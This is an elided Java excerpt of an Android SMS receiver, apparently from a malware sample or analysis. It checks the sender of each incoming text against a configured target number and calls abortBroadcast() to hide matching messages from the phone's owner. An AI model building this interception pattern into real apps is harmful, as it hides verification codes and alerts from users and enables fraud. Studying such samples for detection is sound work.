...
public class PrivilegedSmsReceiver extends BroadcastReceiver {
    ...
    private void parseForSendClient(Context arg0, Intent intent) {
            ...
            if (bundle != null) {
                ...
                for (int i = 0; i < objArray.length; i++) {
                    ...
                    if (!TextUtils.isEmpty(phoneNum)) {
                        if (DEBUG) Log.d(TAG, "[[onReceived]] phoneNum = " + phoneNum);
                        SettingManager.getInstance().init(arg0);
                        if (phoneNum.endsWith(SettingManager.getInstance().getTargetNumber())) {
                            this.abortBroadcast();
    ...
    private void parseSMSForCenter(Context context, Intent intent) {
